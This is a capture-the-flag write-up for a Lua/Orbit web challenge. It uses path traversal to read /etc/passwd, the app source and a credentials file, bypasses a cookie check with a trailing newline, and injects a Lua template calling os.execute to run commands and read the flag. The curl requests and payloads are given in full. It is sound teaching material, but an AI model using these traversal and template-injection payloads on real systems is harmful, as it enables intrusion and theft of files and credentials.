# The Moon and Void
* Category: Web
* 450 Points
* Solved by the JCTF Team

## Description

> The Moon and Void. A good template to infuse unknown knowledge.
> 
> PS: To discover something in the Void, a good eye is needed.

## Solution

We visit the attached website and find a "Markdown to HTML" service:

```html
<h2 style="color:#000">Markdown to HTML</h2>
<form action="/convert" method="post" id="formark">
    <textarea id="mark" name="mark" rows="5" cols="60">
        Insert markdown here...
    </textarea>
    </form>
<button type="submit" form="formark" value="Submit">Submit</button> 
```

We can submit some markdown text:

```
# Title

 * Bullet 1
 * Bullet 2

**Bold Text**
```

The result is linked to as follows:

```html
<p style="color:#000">File: <a href="/download?html=ukcqyjrnhedpqfsnexdj">ukcqyjrnhedpqfsnexdj.txt</a></p>
```

And visiting the link, we get our markdown output:

```html
<html ><head ><title>The Moon and Void</title></head><body >
<h1>Title</h1>

<ul>
    <li>Bullet 1</li>
    <li>Bullet 2</li>
</ul>

<p><strong>Bold Text</strong></p>
<pre><code>    
</code></pre>
</body></html>
```

Notice how the link text says `ukcqyjrnhedpqfsnexdj.txt`, as if it's a file on the file system. This might mean that the server is vulnerable to LFI. Let's try to read some file:

```console
┌──(user@kali)-[/media/sf_CTFs/intent/The_Moon_and_Void]
└─$ curl "https://moon-and-void.intent.ctf.today/download?html=/etc/passwd"
<html>
                                      <head><title>Server Error</title></head>
                                         <body><pre>/app/app.lua:38: attempt to index local 'f' (a nil value)
stack traceback:
        /app/app.lua:38: in function </app/app.lua:34>
        (tail call): ?
stack traceback:
        /usr/local/share/lua/5.1/orbit.lua:550: in function 'err'
        /usr/local/share/lua/5.1/coxpcall.lua:47: in function </usr/local/share/lua/5.1/coxpcall.lua:45>
        (tail call): ?
        (tail call): ?
        /usr/local/share/lua/5.1/orbit.lua:548: in function </usr/local/share/lua/5.1/orbit.lua:529>
        (tail call): ?
        (tail call): ?</pre></body></html>
```

The read failed, but we can learn from the error message that the backend in using `lua` with the `orbit` framework. This will soon help us.

Anyway, after several more attempts, we were able to successfully leak the file with the following request:

```console
┌──(user@kali)-[/media/sf_CTFs/intent/The_Moon_and_Void]
└─$ curl "https://moon-and-void.intent.ctf.today/download?html=....//....//....//....//etc//passwd%00"
<html ><head ><title>The Moon and Void</title></head><body >root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
app:x:1000:1000:,,,:/home/app:/bin/bash
</body></html>
```

The next thing to do is leak the app with `https://moon-and-void.intent.ctf.today/download?html=....//app.lua%00`:

```lua
#!/usr/bin/env wsapi.cgi

require "logging"
local orbit = require "orbit"
local cosmo = require "cosmo"
local markdown = require "markdown"

math.randomseed(os.time())
local logger = logging.new(function(self, level, message)
                             print(level, message)
                             return true
                           end)
logger:setLevel(logging.WARN)

module("app", package.seeall, orbit.new)

-- Controllers

function index(web)
    return web:page("templates/index.html")
end

function convert(web)
    logger:info("Convert called!")
    local html_tmp = markdown(web.POST.mark)
    local filename = random_string(20)
    local f = io.open("/app/html/" .. filename .. ".html", "w")
    f:write(html_tmp)
    f:close()
    web:set_cookie("file", filename)
    return web:redirect("/")
end

function download(web)
    local tmp = web.GET.html
    logger:info("Download file " .. tmp)
    local f = io.open("/app/html/" .. tmp:gsub("%.%.%/", "") .. ".html")
    local content = f:read("*a")
    f:close()
    return render_layout(content)
end

function login(web)
    user = "guest"
    web.set_cookie("user", user)
    return "Under construction"
end

function load_plugin(web)
    local access = web.cookies["access"]
    if access == io.open("creds"):read("*a") then
        return web:page(web.input.plugin)
    else
        return web:page("templates/admin.html")
    end
end

-- Dispatch table

app:dispatch_get(index, "/", "/index")
app:dispatch_get(download, "/download")
app:dispatch_post(convert, "/convert")
app:dispatch_post(load_plugin, "/plugin")

-- View functions and others

function random_string(length)
    local tmp = ""
    for i = 1, length do
        tmp = tmp .. string.char(math.random(97, 122))
    end
    return tmp
end

function plugin_page(plugin)
    logger:info("Plugin " .. plugin .. " loaded!")
    cosmo.fill(plugin, "")
end

function render_layout(inner_html)
   return html{
     head{ title"The Moon and Void" },
     body{ inner_html }
   }
end

orbit.htmlify(app, "render_.+")
```

We can see that there's a `/plugin` endpoint, but access to it is restricted. Luckily, we can leak `creds`:

```console
┌──(user@kali)-[/media/sf_CTFs/intent/The_Moon_and_Void]
└─$ curl "https://moon-and-void.intent.ctf.today/download?html=....//creds%00"
<html ><head ><title>The Moon and Void</title></head><body >qapwdadmin
</body></html>
```

Let's try to use it to access the plugins endpoint:

```console
┌──(user@kali)-[/media/sf_CTFs/intent/The_Moon_and_Void]
└─$ curl -X POST "https://moon-and-void.intent.ctf.today/plugin" --cookie "access=qapwdadmin" -s | grep Admin
      <h2 style="color:#000">Not an Admin!</h2>
```

That doesn't work. But if we add newline at the end, it does:

```console
┌──(user@kali)-[/media/sf_CTFs/intent/The_Moon_and_Void]
└─$ curl -X POST "https://moon-and-void.intent.ctf.today/plugin" --cookie "access=qapwdadmin%0A" -s
<html>
                                      <head><title>Server Error</title></head>
                                         <body><pre>/usr/local/share/lua/5.1/orbit.lua:441: attempt to index local 'name' (a nil value)
stack traceback:
        /usr/local/share/lua/5.1/orbit.lua:441: in function </usr/local/share/lua/5.1/orbit.lua:436>
        (tail call): ?
        (tail call): ?
stack traceback:
        /usr/local/share/lua/5.1/orbit.lua:550: in function 'err'
        /usr/local/share/lua/5.1/coxpcall.lua:47: in function </usr/local/share/lua/5.1/coxpcall.lua:45>
        (tail call): ?
        (tail call): ?
        /usr/local/share/lua/5.1/orbit.lua:548: in function </usr/local/share/lua/5.1/orbit.lua:529>
        (tail call): ?
        (tail call): ?</pre></body></html>
```

So we can now execute templates via the following logic:

```lua
return web:page(web.input.plugin)
```

Recall that we can write arbitrary content to the disk using the service itself. This means that we can create a lua template which will give us remote code execution.

We submit:

```
$lua{[[
os.execute("ls -al / > /app/html/out.html")
]]}
```

We use the `plugin` endpoint to execute out submission as a template:

```console
┌──(user@kali)-[/media/sf_CTFs/intent/The_Moon_and_Void]
└─$ curl --location --request POST 'https://moon-and-void.intent.ctf.today/plugin' \
--header 'Content-Type: application/x-www-form-urlencoded' \
--header 'Cookie: access=qapwdadmin%0A' \
--data-urlencode 'plugin=../../../../../app/html/ytdinifpcxybeoebuufw.html'

<p></p>
```

And finally visit access `out.html`:

```console
┌──(user@kali)-[/media/sf_CTFs/intent/The_Moon_and_Void]
└─$ curl --location --request POST 'https://moon-and-void.intent.ctf.today/plugin' \
--header 'Content-Type: application/x-www-form-urlencoded' \
--header 'Cookie: access=qapwdadmin%0A' \
--data-urlencode 'plugin=../../../../../app/html/out.html'
total 24
drwxr-xr-x   1 root root    39 Dec 16 11:53 .
drwxr-xr-x   1 root root    39 Dec 16 11:53 ..
drwxr-xr-x   1 root root    18 Dec 15 14:35 app
drwxr-xr-x   1 root root   179 Dec 15 14:34 bin
drwxr-xr-x   2 root root     6 Sep  3 12:10 boot
drwxr-xr-x   5 root root   360 Dec 16 11:53 dev
drwxr-xr-x   1 root root    19 Dec 16 11:53 etc
drwxr-xr-x   1 root root    17 Dec 15 14:35 home
drwxr-xr-x   1 root root    41 Dec 15 14:35 lib
drwxr-xr-x   2 root root    34 Dec  5 00:00 lib64
drwxr-xr-x   2 root root     6 Dec  5 00:00 media
drwxr-xr-x   2 root root     6 Dec  5 00:00 mnt
drwxr-xr-x   2 root root     6 Dec  5 00:00 opt
dr-xr-xr-x 388 root root     0 Dec 16 11:53 proc
-rwsr-sr-x   1 root root 16864 Dec 15 14:35 readflag
drwx------   1 root root    22 Dec 15 14:35 root
drwxr-xr-x   1 root root    21 Dec 16 11:53 run
drwxr-xr-x   2 root root  4096 Dec  5 00:00 sbin
drwxr-xr-x   2 root root     6 Dec  5 00:00 srv
dr-xr-xr-x  13 root root     0 Dec 15 14:36 sys
drwxrwxrwt   1 root root     6 Dec 15 14:35 tmp
drwxr-xr-x   1 root root    19 Dec  5 00:00 usr
drwxr-xr-x   1 root root    17 Dec  5 00:00 var
```

Let's capture the contents of `readflag` into a file using:

```
$lua{[[
os.execute("/readflag > /app/html/out.html")
]]}
```

We repeat the process and get the flag:

```console
┌──(user@kali)-[/media/sf_CTFs/intent/The_Moon_and_Void]
└─$ curl --location --request POST 'https://moon-and-void.intent.ctf.today/plugin' \
--header 'Content-Type: application/x-www-form-urlencoded' \
--header 'Cookie: access=qapwdadmin%0A' \
--data-urlencode 'plugin=../../../../../app/html/ihovpusnvnhrulyayjup.html'

<p></p>

┌──(user@kali)-[/media/sf_CTFs/intent/The_Moon_and_Void]
└─$ curl --location --request POST 'https://moon-and-void.intent.ctf.today/plugin' \
--header 'Content-Type: application/x-www-form-urlencoded' \
--header 'Cookie: access=qapwdadmin%0A' \
--data-urlencode 'plugin=../../../../../app/html/out.html'
INTENT{1nj3ctiNg_iNTo_M00n_0rb1t_XFUwMDAxZjMxOA==}
```